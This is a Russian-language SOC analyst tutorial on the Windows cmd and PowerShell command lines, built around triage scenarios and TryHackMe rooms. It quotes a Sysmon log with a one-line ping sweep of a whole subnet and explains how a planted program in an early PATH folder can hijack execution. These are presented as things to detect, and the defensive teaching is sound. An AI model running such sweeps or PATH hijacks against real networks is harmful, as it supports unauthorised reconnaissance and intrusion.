Учебник: Command Line

Модуль: Cyber Security 101 · Комнаты: Windows Command Line, Windows PowerShell, Linux Shells.

Что будешь уметь после учебника:

  • открыть командную строку на Windows и на маке и за пару минут собрать то, что идёт в тикет: какая машина, кто вошёл, что за процессы, с кем они говорят по сети;
  • прочитать чужую команду по частям — cmd.exe /c, | findstr, 1> \\…\ADMIN$, for /l — и понять, что она делает;
  • собрать из маленьких команд один конвейер, который из 2000 строк журнала выдаёт один ответ, и в cmd, и в PowerShell, и в bash;
  • по виду процесса и его родителю отличить обычную работу от следа, который оставляет взлом;
  • прочитать и написать простой скрипт bash, который делает ночную проверку журнала за тебя;
  • коротко доложить такой разбор по-немецки и собрать строку для тикета.

Маршрут:

  • 🔥🧪 Главы 1–2. cmd: система, файлы, процессы, сеть — комната Windows Command Line: пройди. В комнате своя Windows по SSH, на маке cmd нет, а руками это главное. ~45 мин.
  • 🔥🧪 Главы 3–4. PowerShell: командлеты, конвейер, разбор на смене — Windows PowerShell: пройди. Учётки, службы и соединения смотришь на живой Windows, текстом не заменить. ~60 мин.
  • 🔥🤔 Главы 5–6. Оболочки Linux и скрипты — Linux Shells: по желанию. Всё из неё повторишь в Терминале мака прямо по главам; комнату прокликай ради галочки пути SEC1. ~45 мин экономии.

Итого: 6 глав, все 🔥 обязательные — эти команды ты видишь в каждом алерте EDR, с какой бы системы он ни пришёл. Две комнаты пройди руками, одну по желанию. Практика — в конце, на настоящих журналах, выполнима на маке без виртуалок.

Слова смены, которые будут повторяться (из прошлых учебников — чтобы не спотыкаться):

  • Смена — рабочий день аналитика в SOC: сидишь, разбираешь прилетающие алерты (сигналы «тут что-то подозрительное»).
  • Тикет — карточка-задача, куда ты записываешь, что нашёл: что, когда, где, что делать. Твой главный «документ» на смене.
  • L1 / L2 — уровни аналитиков. L1 — первая линия (это ты): быстро разбирает алерт и решает, пустой он или нет. L2 — вторая линия: разбирается глубже с тем, что L1 передал наверх.
  • Эскалировать — передать алерт на L2, когда он подтвердился. L1 обычно сам ничего не «чинит» и ничего не удаляет: фиксирует находку и эскалирует.
  • MITRE ATT&CK — общий каталог приёмов атак. У каждого приёма свой номер вида T1059; по нему любой в мире понимает, о чём речь. В тексте такие номера идут справкой, заучивать не надо.

Глава 1. Командная строка Windows: система, файлы, процессы (Windows Command Line)

🔥Обязательно — cmd стоит на каждой Windows, и через неё за две минуты собираешь всё, что идёт в тикет: что за машина, кто вошёл, какие процессы запущены
🧪
Пройди Windows Command Line — прочитай главу → пройди комнату → вернись к «Сделай сам». В комнате своя Windows-машина по SSH, на маке её не потрогать. ~45 мин.

Ты на смене

22:10. Из консоли EDR приходит уведомление: на файловом сервере FUE-FS01 под учёткой adm.weber за двадцать секунд подряд запустились whoami.exe, systeminfo.exe и tasklist.exe. Графического экрана у сервера нет — только командная строка через консоль.

Так осматривается почти любой, кто только что попал на машину. Но ровно так же начинает и админ, и программа инвентаризации. За пять минут тебе надо ответить:

  1. Что это за машина и кто такой adm.weber?
  2. Какие именно команды запускались и кто их родитель — человек в своём окне или что-то постороннее?
  3. Какие процессы сейчас живут и с кем машина говорит по сети (сеть — в главе 2)?

Всё, что ниже, — инструменты для этих ответов.

Аналогия

Мышка и окна — это меню в кафе с картинками: удобно, пока выбираешь из нарисованного. Командная строка — разговор с поваром напрямую: «три яйца, без соли, и покажи, что в холодильнике». Картинок нет, зато просишь ровно то, что нужно, и ответ приходит сразу. На сервере меню с картинками часто нет совсем — повар есть всегда.

Сначала слова, без которых дальше не понять

Командная строка (command line, CLI — command-line interface, «интерфейс командной строки»). Окно, где компьютером управляют текстом: пишешь команду, жмёшь Enter, получаешь ответ текстом. На маке это Терминал, в Windows — cmd и PowerShell (глава 3).

Оболочка (shell), она же интерпретатор команд. Программа внутри этого окна: читает набранное, понимает и выполняет. В Windows их две: старая cmd (файл cmd.exe) и новая PowerShell. Окно — телефонная трубка, оболочка — тот, кто отвечает на другом конце.

Команда. Слово, которое оболочка понимает как приказ: hostname — «назови своё имя». Часто команда — это маленькая программа-файл с окончанием .exe (так в Windows называются исполняемые программы) в папке C:\Windows\System32 — это папка системных программ Windows (название историческое, с 32-битных времён; рядом бывает SysWOW64 — та же роль для старых программ). Например, tasklist.exe.

Служба (service, по-немецки Dienst). Программа, которая работает в фоне без окна и обычно стартует вместе с Windows: печать, обновления, общие папки. Про неё подробнее было в учебнике по Windows.

Ключ (switch, он же параметр). Уточнение к команде, в cmd пишется через косую черту: dir /a — «покажи папку, включая скрытые файлы». Меняет поведение команды, как «без соли» меняет заказ.

Аргумент. То, над чем команда работает: type notes.txt — показать файл notes.txt; имя файла здесь аргумент.

Переменная окружения (environment variable). Именованная настройка, которую Windows держит для каждой программы: USERNAME — кто ты, COMPUTERNAME — имя машины, Path — список папок, где искать программы. Как стикеры на холодильнике, которые читает каждый в доме.

Родитель процесса (parent process). Процесс — запущенная программа; у каждого свой номер PID и свой родитель — тот процесс, который его запустил. Блокнот, открытый мышкой, родитель — explorer.exe (рабочий стол). Если же родитель у cmd.exe посторонний, это и есть главная зацепка смены.

Открыть cmd и понять, где ты

На смене: первое на чужой машине — проверить, на какой ты машине и под какой учёткой, иначе однажды проверишь не тот сервер.

Как устроено. Открыть cmd на своей Windows: нажми Win (клавиша с флажком Windows) вместе с R, набери cmd, Enter. Или Пуск → «Командная строка». Нужны права администратора — правой кнопкой → «Запуск от имени администратора». В комнате THM своя Windows, и ты заходишь на неё по SSH одной строкой из Терминала (адрес и пароль комната даёт сама):

ssh user@10.10.37.112

Первый раз SSH спросит, доверяешь ли машине, — ответь yes, потом введи пароль (при вводе символы не видны, это нормально). После входа cmd откроется сразу:

C:\Users\user>hostname
FUE-FS01

C:\Users\user>whoami
kranich\adm.weber

C:\Users\user>ver

Microsoft Windows [Version 10.0.20348.2655]

Строка C:\Users\user> — приглашение (prompt): «я готов, пиши; ты в папке C:\Users\user». Знак > — его конец.

  • hostname — имя машины.
  • whoami — учётка как домен\имя. Если вместо домена стоит имя самой машины (fue-fs01\admin), это локальная учётка — есть только на этом компьютере.
  • ver — версия Windows. 10.0.20348 — номер сборки (build): 20348 — Windows Server 2022, 22631 — Windows 11 23H2, 19045 — Windows 10 22H2. Номер сборки точнее названия.
  • cls — очистить экран. Ctrl+C — аварийный стоп, если команда зависла.

Почти у каждой команды есть встроенная справка: ключ /?, например dir /?. Список команд cmd — help.

Варианты, которые встретятся: на немецкой Windows командная строка называется Eingabeaufforderung, в заголовке окна от администратора — «Administrator: Eingabeaufforderung». Зайдёшь по SSH — окно может открыться сразу в PowerShell (приглашение начинается с PS); перейти в cmd — набрать cmd.

Если не получилось: - 'hostnme' is not recognized as an internal or external command — опечатка в команде. - Access is denied. (нем. «Zugriff verweigert») — не поломка, а нехватка прав: перезапусти cmd от администратора.

Ошибка новичка: открыть cmd без прав администратора и решить, что команда «не работает», хотя на самом деле ей не хватило прав.

Переменные окружения: set

На смене: по переменным видно, кто ты, что за машина и какие папки она считает «своими» для программ, — а последнее атакующие подменяют, чтобы подсунуть свою программу вместо настоящей.

Как устроено. set без аргументов печатает все переменные; set Имя — только нужные:

C:\Users\adm.weber>set COMPUTERNAME
COMPUTERNAME=FUE-FS01

C:\Users\adm.weber>set Path
Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Users\adm.weber\AppData\Local\Microsoft\WindowsApps
  • COMPUTERNAME, USERNAME — имя машины и учётки (то же, что hostname и whoami, но из памяти Windows).
  • Path — список папок через точку с запятой, где Windows ищет программу, когда ты пишешь её имя без полного пути. Ищет слева направо и берёт первое совпадение.

Ошибка новичка: не заметить в Path лишнюю папку в начале. Windows ищет программу по списку Path слева направо, так что если первой стоит папка, куда может писать кто угодно (например Temp — папка временных файлов), туда можно положить свой net.exe, и он запустится вместо настоящего из System32 (в MITRE это приём T1574.007). Нормальный Path начинается с C:\Windows\system32.

Если не получилось: set Patth просто ничего не выведет — проверь имя переменной, регистр в именах не важен (set path = set Path).

Что за машина: systeminfo и driverquery

На смене: в тикет идёт точная система и патч-уровень; по ним же понимают, уязвима ли машина к конкретной атаке.

Как устроено. systeminfo печатает большую карточку машины. Смотрят несколько строк:

C:\Users\adm.weber>systeminfo

Host Name:                 FUE-FS01
OS Name:                   Microsoft Windows Server 2022 Standard
OS Version:                10.0.20348 N/A Build 20348
System Boot Time:          15.09.2026, 06:14:52
Domain:                    kranich.local
Hotfix(s):                 42 Hotfix(s) Installed.
Строка Что значит Зачем тебе
OS Name / OS Version система и сборка уязвима ли к известной атаке
System Boot Time когда машину включали если «аптайм» месяцами — патчи не ставились
Domain домен или WORKGROUP машина в домене фирмы или сама по себе
Hotfix(s) сколько исправлений стоит пусто или мало — машина без обновлений

Длинный вывод листают постранично: systeminfo | more (пробел — дальше, q — выход). driverquery так же показывает драйверы — иногда среди них прячется лишний.

Если не получилось: systeminfo на удалённой машине отвечает иногда 10–20 секунд — это нормально, он опрашивает всю систему, а не завис.

Ошибка новичка: писать в тикет «Windows 10» по памяти. Пиши строку OS Version как есть: 10.0.20348 — это Server 2022, а не «десятка».

Файлы и папки: cd, dir, tree, type

На смене: подозрительный файл, лог, скрипт — всё это файлы в папках. Надо дойти до них и заглянуть внутрь, ничего не меняя.

Как устроено. В Windows файлы живут на дисках C:, D:; внутри — папки, разделённые обратной косой \.

C:\Users\adm.weber>cd C:\Users\Public

C:\Users\Public>dir
15.09.2026  22:03    <DIR>          Downloads
15.09.2026  22:08             4 096 update.exe
15.09.2026  22:08                16 note.txt
               2 File(s)          4 112 bytes

C:\Users\Public>type note.txt
backup at 03:00
Команда Что делает
cd папка перейти в папку; cd .. — на уровень вверх; cd \ — в начало диска (его корень)
dir список папки; dir /a — со скрытыми файлами; dir /s — вместе со всеми вложенными папками
tree папки деревом, наглядно
type файл показать текстовый файл целиком; большой — type файл | more
copy, move, del копировать, переместить, удалить

<DIR> в списке — это папка, остальное — файлы. Маска * заменяет любые символы: dir *.exe — только программы.

Если не получилось: - The system cannot find the path specified. — нет такой папки: проверь dir, нет ли опечатки. - Access is denied. — нет прав на папку; на смене это само по себе заметка, а не повод лезть силой.

Ошибка новичка: на смене del и move не трогают улики руками. Файлы на чужой машине только смотрят (dir, type). Если файл важен, L1 записывает в тикет его путь и хэш (как снять хэш — глава 4), а сам файл сохраняет и изучает уже L2 или форензика; удалять и переносить — это портить доказательства.

Процессы: tasklist и taskkill

На смене: увидел в алерте имя программы — надо понять, запущена ли она сейчас, под кем и с каким PID; по PID её потом находят в сети и, если решат, останавливают.

Как устроено. tasklist печатает все процессы; фильтр /FI сужает список:

C:\Users\adm.weber>tasklist /FI "imagename eq sshd.exe"

Image Name          PID Session Name     Session#    Mem Usage
================ ====== ============== =========== ============
sshd.exe           4712 Services                 1      9 684 K
  • /FI "imagename eq sshd.exe" — «где имя образа равно sshd.exe» (имя образа — имя файла программы). Кавычки обязательны, eq — equals, «равно».
  • PID — номер процесса; Mem Usage — сколько памяти занял.

Остановить процесс по номеру — taskkill /PID 4712; упрямый — taskkill /PID 4712 /F (/F — force, силой). На смене L1 процесс обычно не убивает сам: сначала фиксирует и эскалирует, иначе потеряешь улику и спугнёшь.

Если не получилось: - INFO: No tasks are running which match the specified criteria. — процесса с таким именем нет; это ответ, а не ошибка. - ERROR: ... Access is denied. — процесс чужой или системный, нужны права администратора.

Ошибка новичка: судить о программе по имени. svchost.exe — честная системная программа, но тем же именем маскируются и вредоносные. Поэтому имя без пути и родителя ничего не доказывает — смотри их вместе (следующий раздел).

Норма процесса: путь и родитель

На смене: главный приём главы. У системных программ Windows есть своё место и свой родитель. Совпадает — норма; не совпадает — зацепка, даже если имя знакомое.

Три системные программы, которые будешь встречать постоянно: services.exe запускает все службы Windows; svchost.exe — «общий дом» для служб, их на машине всегда несколько; explorer.exe — это рабочий стол и проводник, из него открываются твои обычные программы.

Запомнить всё дерево не нужно. Нужны три правила-зацепки:

  • svchost.exe родитель — всегда services.exe. svchost.exe, запущенный из winword.exe или из cmd.exe, — почти наверняка маскировка.
  • Системные программы лежат в C:\Windows\System32 (или SysWOW64). Та же svchost.exe из C:\Users\Public\ — чужая под чужим именем.
  • cmd.exe или powershell.exe, у которых родитель — офисная программа (winword.exe, excel.exe) или серверная служба, — это частый след: документ с макросом или взломанный сервис запустил оболочку.

Важное ограничение: tasklist показывает имя и PID, но не показывает ни путь, ни родителя. Их смотрят в Диспетчере задач (на машине с экраном) или в журнале запусков Sysmon (это дополнение к Windows, которое на каждый запуск программы пишет событие с её путём и родителем; подробно — в учебнике по Windows). Поэтому «имя + путь + родитель» ты собираешь не одной командой, а из журнала или EDR. Но знать правило надо: по нему ты читаешь дерево в любом инструменте.

Ошибка новичка: успокоиться на знакомом имени. На смене связка «имя + путь + родитель» решает, а не одно имя.

Три значка, которые ты увидишь в чужих командах и которые делают в cmd то же, что grep и > в Linux (глава 5):

Глава 2. Командная строка Windows: сеть и обслуживание

🔥Обязательно — Та же комната Windows Command Line, вторая половина. Сеть — половина работы L1: откуда соединение, кто слушает порт, какой процесс за ним

Ты на смене

23:40. Алерт: с рабочей станции FUE-WS14 за две минуты ушли сотни маленьких запросов на соседние адреса подсети — по одному на каждый. (Подсеть — группа соседних адресов в одной локальной сети, например все 192.168.20.*.) Выглядит как «кто-то переписывает, кто в сети живой».

Это сканирование сети (разведка): машина по очереди стучится ко всем соседям, чтобы составить их список. Так делает и тот, кто захватил станцию (получил на ней управление), и обычная программа инвентаризации. Три навыка, которые закрывают такой алерт, — ровно команды этой главы:

  1. узнать свой адрес, шлюз и MAC (ipconfig);
  2. по журналу понять, правда ли это перебор по подсети, а не совпадение (разберём в «Вживую»);
  3. посмотреть, какие порты машина слушает и какой процесс за соединением (netstat + tasklist).

Аналогия

Сеть — это подъезд с квартирами. IP-адрес — номер квартиры, порт — номер двери внутри квартиры (у одной квартиры дверей много, за каждой свой жилец-служба). Сканирование — когда кто-то идёт по этажу и звонит в каждую квартиру подряд, отмечая, где открыли. Один звонок — не вопрос; двести звонков за минуту по порядку — вопрос.

Сначала слова, без которых дальше не понять

Шлюз по умолчанию (default gateway). Адрес роутера — «выход из подъезда на улицу». Всё, что уходит в другие сети и в интернет, идёт через него. Был в сетевом учебнике.

DNS (Domain Name System). Телефонная книга интернета: превращает имя example.com в IP-адрес. Компьютер сам спрашивает DNS перед каждым обращением по имени.

Слушать порт (listening). Программа «стоит у двери» с определённым номером и ждёт входящих подключений. На 445 слушают общие папки Windows (папки, которые машина отдаёт другим по сети), на 3389 — удалённый рабочий стол (вход на машину с её экраном по сети). Если порт никто не слушает — дверь заперта, достучаться некуда.

Внутренний и внешний адрес. Адреса, которые начинаются на 192.168., 10. или 172.16–31., — внутренние, это машины твоей же сети. Всё остальное — внешние, в интернете. Соединение на внешний адрес — не беда само по себе (так работает любой браузер), но его первым и проверяешь.

Сканирование (scan). Перебор: пройтись по многим адресам или портам подряд, чтобы узнать, кто отвечает и какие двери открыты. Первый шаг почти любой атаки — и обычный приём админских программ.

Свой адрес: ipconfig

На смене: прежде чем разбирать соединение, надо знать адрес самой машины, её шлюз и MAC — это пишут в тикет и по этому отличают «свой» трафик от чужого.

Как устроено. ipconfig печатает коротко, ipconfig /all — подробно, с MAC и DNS:

C:\Users\adm.weber>ipconfig /all

Ethernet adapter Ethernet0:
   Physical Address. . . . . . . . . : 00-15-5D-0A-14-21
   IPv4 Address. . . . . . . . . . . : 192.168.20.14
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.20.1
   DNS Servers . . . . . . . . . . . : 192.168.20.10
Строка Что значит Зачем тебе
Physical Address MAC-адрес — заводской номер сетевой карты, 00-15-5D-… IP может меняться, MAC обычно нет — по нему находят устройство
IPv4 Address адрес машины в сети «свой» адрес, с ним сверяешь строки журнала
Subnet Mask маска — какие адреса считаются «соседями» …255.0 значит соседи 192.168.20.1–192.168.20.254
Default Gateway шлюз (роутер) через него машина выходит наружу
DNS Servers кто переводит имена в адреса чужой DNS в этой строке — повод насторожиться

Если не получилось: Media disconnected в выводе — у этого адаптера нет связи (кабель/сеть отключены); смотри адаптер, где есть IPv4 Address.

Ошибка новичка: взять первый попавшийся адрес. В списке кроме основной сетевой карты бывают служебные адаптеры (у Wi-Fi строка называется Wireless LAN adapter, бывают виртуальные — от программ вроде VirtualBox). Нужный, рабочий адаптер — тот, у которого заполнена строка Default Gateway.

Проверить связь и путь: ping, tracert, nslookup

На смене: быстро ответить «машина жива?», «далеко ли до неё?», «во что превращается это имя?» — три разные команды.

Как устроено.

C:\Users\adm.weber>ping 192.168.20.1

Pinging 192.168.20.1 with 32 bytes of data:
Reply from 192.168.20.1: bytes=32 time=1ms TTL=64
Reply from 192.168.20.1: bytes=32 time=1ms TTL=64
Reply from 192.168.20.1: bytes=32 time=1ms TTL=64
Reply from 192.168.20.1: bytes=32 time=1ms TTL=64

Ping statistics for 192.168.20.1:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss)
  • ping адрес — шлёт четыре коротких «ты там?» и ждёт Reply. Есть ответы и 0% loss — машина жива и в сети.
  • Request timed out или 100% loss — не ответила: выключена, занята или закрыта файрволом. «Нет ответа» ≠ «машины нет».
  • tracert адрес — показывает все узлы по пути до цели: видно, где трафик теряется.
  • nslookup example.com — спрашивает DNS, какой у имени адрес. nslookup example.com 1.1.1.1 — спросить у конкретного DNS-сервера 1.1.1.1.

Если не получилось: ping: transmit failed или could not find host — проверь, есть ли вообще сеть (ipconfig), и нет ли опечатки в имени.

Ошибка новичка: решить, что раз ping не прошёл, то машины нет. Многие хосты и файрволы специально не отвечают на ping — проверяй ещё и порт.

Кто с кем говорит: netstat

На смене: главная сетевая команда. netstat показывает все соединения и, с нужными ключами, какой процесс за каждым. С этого начинается разбор «машина куда-то стучится».

Как устроено. Рабочая связка ключей — netstat -ano (а с -b ещё и имя программы, но нужны права администратора):

C:\Users\adm.weber>netstat -ano

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    192.168.20.14:50533    192.168.20.10:443      ESTABLISHED     3120
  TCP    192.168.20.14:50540    203.0.113.80:443       ESTABLISHED     6120
Колонка Что значит Зачем тебе
Proto протокол, TCP или UDP почти всегда TCP
Local Address свой адрес и порт 0.0.0.0:445 — ждёт входящих на 445 со всех адресов
Foreign Address адрес и порт другой стороны куда идёт соединение
State LISTENING — ждёт, ESTABLISHED — соединение открыто открытые наружу ESTABLISHED — главное
PID номер процесса за соединением по нему находишь программу

Ключи: -a — все соединения и слушающие порты, -n — адреса числами (не переводить в имена, быстрее), -o — показать PID, -b — имя программы. Склеиваются: -ano.

Процесс по PID находишь командой из главы 1:

C:\Users\adm.weber>tasklist /FI "PID eq 6120"

Image Name          PID Session Name     Session#    Mem Usage
================ ====== ============== =========== ============
chrome.exe         6120 Console                 1    148 220 K

Порт 445 у PID 4 — норма: это общие папки Windows, их держит сама система (процесс System, у него PID всегда 4). А вот ESTABLISHED на внешний адрес, за которым по PID стоит не браузер и не почта, а что-то постороннее, — это зацепка: программа без причины говорит наружу, так уносят данные или получают команды. Что делаешь дальше: по PID смотришь, что за процесс и откуда он запущен (путь и родитель, глава 1), пробиваешь внешний адрес по репутации (как IOC, прошлый учебник) и, если не объясняется, эскалируешь — адрес и процесс в тикет.

Если не получилось: в netstat -anob колонка имени пустая или Can not obtain ownership information — запусти cmd от администратора.

Ошибка новичка: пугаться строк LISTENING на 0.0.0.0. Это норма: система ждёт на своих служебных портах. Разбираешь в первую очередь ESTABLISHED наружу, на чужие адреса.

Обслуживание: chkdsk, sfc, shutdown

На смене: редко, но спрашивают: проверить диск, проверить целостность системных файлов, перезагрузить или отменить выключение.

Как устроено.

Команда Что делает Когда
chkdsk проверяет диск на ошибки диск «сыпется», странные сбои
sfc /scannow проверяет системные файлы и чинит подменённые подозрение, что подменили системный файл; нужны права администратора
shutdown /s /t 600 выключить через 600 секунд (/s — shutdown, /t — задержка) плановое выключение

Если не получилось: You must be an administrator у sfc и chkdsk — перезапусти cmd от администратора.

Ошибка новичка: перепутать ключ выключения с ключом перезагрузки на удалённом сервере — машина выключится, а поднять её некому. Перед запуском сверяй ключ по shutdown /?.

Вживую: сканирование в настоящем журнале

Разберём настоящий захват Sysmon с машины из открытого набора. За две минуты запустилось 254 процесса ping.exe подряд — по одному на каждый адрес 192.168.1.1 … 192.168.1.254. Родитель у всех один:

Image:         C:\Windows\System32\PING.EXE
CommandLine:   ping  -n 1 -w 100 192.168.1.1
ParentImage:   C:\Windows\System32\cmd.exe
ParentCommandLine:  cmd.exe /c "for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"

Читаем родительскую строку — в ней весь замысел:

  • for /l %i in (1,1,254) — цикл: %i пробегает числа от 1 до 254 с шагом 1.
  • do ping -n 1 -w 100 192.168.1.%i — на каждом шаге пингануть адрес 192.168.1.<номер>. -n 1 — один пакет, -w 100 — ждать ответа всего 100 мс (не задерживаться).

То есть одной строкой машина обошла всю подсеть. Это сканирование сети (в MITRE это T1018 — поиск других хостов, то есть машин в сети). По числам: 254 запуска за 126 секунд — это ровно по два в секунду, без пауз и сбоев. Человек руками так не печатает: у него были бы разные интервалы, опечатки, остановки. Ровный автоматический темп и перебор адресов по порядку — почерк программы, а не человека.

На смене такой ряд — «много одинаковых запусков подряд, ровным темпом, по порядку адресов» — ты узнаёшь в любом журнале: это перебор, а не работа человека.

Похоже на сетевую разведку. Уточняю у команды, была ли на это время плановая
инвентаризация; если нет — эскалирую.

Копнуть глубже: как узнать службу за портом

netstat -ano даёт порт и PID, но не говорит, что это за служба. Дальше два пути:

  • по PID — tasklist /FI "PID eq <номер>" даёт имя программы (как выше);
  • по номеру порта — у стандартных служб порты закреплены: 80 — веб (HTTP), 443 — веб по HTTPS, 53 — DNS, 445 — общие папки Windows, 3389 — удалённый рабочий стол. Полный список привычных портов — в справочнике полки (вкладка «Порты»).

В комнате как раз спрашивают имя службы за парой портов — связываешь номер порта с его службой по этому правилу.

Мини-квиз

netstat -ano показал TCP 0.0.0.0:445 … LISTENING 4. Это тревога?
Ты видишь 254 запуска ping.exe за две минуты ровным темпом. Что это?
ping до сервера дал 100% loss. Можно ли писать «сервер выключен»?

Выжимка

  • ipconfig /all — свой адрес, шлюз, MAC, DNS; «боевой» адаптер тот, у которого есть Default Gateway.
  • ping проверяет связь, но «нет ответа» ≠ «машины нет»: многие хосты на ping молчат.
  • netstat -ano — соединения и PID; разбираешь в первую очередь ESTABLISHED наружу, LISTENING на системных портах — норма.
  • Процесс за соединением находишь по PID через tasklist /FI "PID eq …".
  • Много одинаковых запусков подряд ровным темпом (254 ping за 2 минуты) — это цикл, то есть сканирование, а не человек.

Глава 3. PowerShell: командлеты, объекты, конвейер (Windows PowerShell)

🔥Обязательно — PowerShell — рабочий инструмент L1 на Windows: один конвейер отбирает из тысяч строк нужное. На маке он тоже есть, так что отрабатывать будешь прямо тут
🧪
Пройди Windows PowerShell — прочитай главы 3–4 → пройди комнату → вернись к «Сделай сам». В комнате живая Windows с учётками и службами, на маке таких нет. ~60 мин.

Ты на смене

01:15. Алерт: на сервере FUE-APP01 процесс-список за минуту вырос вдвое. Нужно за пару минут показать, какие процессы съедают больше всего памяти и нет ли среди них запущенных из чужих папок.

В cmd это несколько команд и ручной просмотр. В PowerShell — один конвейер: взять процессы, оставить тяжёлые, отсортировать, показать нужные колонки. Эта глава — про то, как такой конвейер собирается.

Аналогия

cmd выдаёт текст, который ты читаешь глазами. PowerShell выдаёт объекты — как карточки товара с полями. У процесса есть поля: имя, PID, сколько памяти, путь. С карточками удобнее: «оставь, где память больше 200 МБ», «отсортируй по памяти», «покажи только имя и путь» — и всё это коротко, не выискивая глазами в простыне текста.

Сначала слова, без которых дальше не понять

PowerShell. Новая командная оболочка Windows поверх cmd: те же задачи, но мощнее. Команды в ней называются командлетами и возвращают не текст, а объекты.

Командлет (cmdlet, «командлет»). Команда PowerShell. Имя всегда из двух частей — Глагол-Существительное: Get-Process («получить процессы»), Stop-Service («остановить службу»). По имени понятно, что команда делает, даже если видишь её впервые.

Объект (object). Не просто строка текста, а «карточка» с именованными полями. Поле — это одна строка такой карточки, например «память» или «путь»; у полей есть второе имя — свойства (properties), это одно и то же. Когда PowerShell печатает много объектов таблицей, колонка таблицы — это и есть поле. У объекта-процесса поля Name (имя), Id (PID), WS (память), Path (путь к файлу).

Конвейер (pipeline, значок |). Лента, по которой объекты одной команды уходят на вход следующей. Читается слева направо: что вышло из команды слева, то вошло в команду справа. Get-Process | Sort-Object WS — все процессы уходят в сортировку по полю WS. Ни одна команда не ждёт «конца» — объекты текут по ленте один за другим.

$_ и точка. В условиях ты будешь писать $_ — это «текущая карточка на ленте» (очередной объект). Точка после неё — обращение к полю: $_.WS значит «поле WS у текущей карточки». Знак $ в PowerShell всегда помечает переменную.

Алиас (alias, псевдоним). Короткое второе имя командлета. ls, dir, gci — всё это псевдонимы для Get-ChildItem. Удобно руками, но в скрипты и тикеты пиши полное имя — так понятнее.

Запуск и как понять, что ты в PowerShell

На смене: сначала убедись, что ты именно в PowerShell, а не в cmd, — команды разные.

Как устроено. Открыть: Пуск → «Windows PowerShell», или в cmd набрать powershell. Приглашение PowerShell начинается с PS:

PS C:\Users\adm.weber>

PS в начале — главный признак. Версию покажет встроенная переменная:

PS C:\Users\adm.weber> $PSVersionTable.PSVersion

Major  Minor  Patch
-----  -----  -----
5      1      0
  • Windows PowerShell 5.1 стоит на каждой Windows — старая, но вездесущая.
  • PowerShell 7 (её ставят отдельно, и именно она есть на маке) — новее. На смене важно: в 7-й версии журнал скриптов пишется в другое место (глава 4).

$PSVersionTable — переменная; в PowerShell имена переменных начинаются с $.

Варианты, которые встретятся: на маке PowerShell 7 запускается командой pwsh в Терминале. Приглашение и командлеты те же, так что всю эту главу отрабатывай на маке.

Если не получилось: набрал powershell, а приглашение осталось без PS — возможно, команды такой нет (очень старая система); на маке запускай pwsh, а не powershell.

Ошибка новичка: путать cmd и PowerShell по виду окна. Окно одинаково чёрное — смотри на приглашение: PS в начале значит PowerShell.

Командлеты и как самому найти нужный

На смене: ты не помнишь все команды — и не надо. Надо уметь за полминуты найти нужный командлет и прочитать, как он работает.

Как устроено. Три команды-помощника:

PS C:\> Get-Command -Verb Get -Noun Process

CommandType   Name          Source
-----------   ----          ------
Cmdlet        Get-Process   Microsoft.PowerShell.Management
  • Get-Command ищет командлеты. -Verb Get — все команды с глаголом Get, -Noun Service — все про службы. Так находишь команду, не зная её имени точно.
  • Get-Help Get-Process -Examples — показывает примеры запуска команды. Самое полезное: сразу видишь, как её применяют.
  • Get-Alias ls — говорит, какому полному командлету равен короткий псевдоним (ls → Get-ChildItem). И наоборот: Get-Alias -Definition Get-ChildItem — все псевдонимы этой команды.

Нужного командлета нет в системе — его ставят из общего хранилища: Find-Module имя ищет, Install-Module имя ставит. На смене сам обычно не ставишь, но в чужой истории команда Install-Module значит «кто-то дотянул себе инструмент».

Если не получилось: Get-Help в первый раз предлагает Update-Help (скачать справку). Без интернета справка будет краткой — это нормально, примеры всё равно обычно есть.

Ошибка новичка: гадать имя команды. Глагол из набора известных (Get, Set, New, Remove, Stop, Start), существительное — предмет; Get-Command -Verb Get -Noun *user* найдёт всё про пользователей.

Файлы: Get-ChildItem, Get-Content

На смене: дойти до файла и прочитать его — так же часто, как в cmd, только команды другие (и те же, что в Linux, но через псевдонимы).

Конвейер: отобрать, отсортировать, оставить нужное

На смене: главный приём главы. Из большого списка объектов конвейер оставляет нужное за одну строку. Четыре командлета делают почти всё.

Как устроено. Разберём по шагам на процессах. Каждый шаг добавляет одно звено через |.

Шаг 1. Все процессы:

PS C:\> Get-Process

Handles  NPM(K)  PM(K)   WS(K)   CPU(s)   Id  ProcessName
-------  ------  -----   -----   ------   --  -----------
    512      28  45120  102400    12.5  3120  chrome
    210      12   8200   22010     0.4  6120  svchost

Это объекты, показанные таблицей. Нужные поля: Id — PID, ProcessName — имя (у процесса это поле называется и Name, и ProcessName — оба работают), WS(K) — память. Важная тонкость: в таблице память обозначена WS(K) и показана в килобайтах «для красоты», а само поле $_.WS хранит число в байтах. Поэтому ниже сравниваем его с 50MB, а не с «50000».

Чтобы увидеть одну карточку целиком, по полям в столбик, — Format-List:

PS C:\> Get-Process chrome | Select-Object Name, Id, WS, Path | Format-List

Name : chrome
Id   : 3120
WS   : 104857600
Path : C:\Program Files\Google\Chrome\Application\chrome.exe

Вот это и есть «карточка»: слева имена полей, справа значения. Таблица выше — просто много таких карточек в строчку.

Шаг 2. Оставить тяжёлые — Where-Object (псевдоним where или ?) отбирает по условию:

PS C:\> Get-Process | Where-Object { $_.WS -gt 50MB }
  • { … } — условие; $_ — «текущий объект» (очередной процесс с ленты), .WS — его поле «память».
  • -gt — greater than, «больше»; 50MB PowerShell понимает как 50 мегабайт. Другие сравнения: -lt меньше, -eq равно, -ne не равно, -ge/-le больше/меньше или равно, -like — по шаблону со *.

Шаг 3. Отсортировать по памяти, крупные сверху — Sort-Object:

PS C:\> Get-Process | Where-Object { $_.WS -gt 50MB } | Sort-Object WS -Descending

-Descending — по убыванию (без него — по возрастанию).

Шаг 4. Оставить только нужные колонки и верхние 5 — Select-Object:

PS C:\> Get-Process | Where-Object { $_.WS -gt 50MB } |
        Sort-Object WS -Descending | Select-Object Name, Id, WS, Path -First 5

Name     Id          WS  Path
----     --          --  ----
chrome   3120  104857600  C:\Program Files\Google\Chrome\...\chrome.exe
msedge   4820   89128960  C:\Program Files\...\msedge.exe

